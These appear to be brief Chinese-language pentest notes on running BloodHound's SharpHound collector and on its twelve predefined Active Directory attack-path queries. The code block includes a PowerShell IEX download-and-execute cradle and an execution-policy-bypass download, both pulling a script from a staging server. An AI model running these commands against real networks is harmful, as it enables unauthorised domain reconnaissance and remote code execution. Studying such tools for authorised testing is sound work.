# BloodHound

```powershell
# 他下面有俩个脚本，一个是ps1,一个是exe，功能都是一样的
https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors
./SharpHound.exe -c all # exe命令

# ps1的执行方法
. ./SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# 下载文件
powershell IEX(New-object Net.webclient).downloadString('http://172.16.99.41:8080/11.ps1')
powershell -ExecutionPolicy Bypass  -c "(new-object System.Net.WebClient).DownloadFile('http://172.16.99.41:8080/11.ps1','.\111111.ps1')"

# 在将文件上传到图形化中
```

下面我们进入查询模块，可以看到有预定义了12个常用的查看条件

1. 查找所有域管理员
2. 寻找最短到达域管理员路径
3. 寻找管理员登陆记录
4. 存在Session记录最多的前十个用户
5. 存在Session记录最多的前十个计算机
6. 拥有最多本地管理权限的前十个用户
7. 拥有最多的管理员登陆的前十个机器
8. 具有外部域组成员的用户
9. 具有外部域组成员的组
10. 域信任地图
11. SPN用户的最短路径
12. SPN用户到域管理员的最短路径


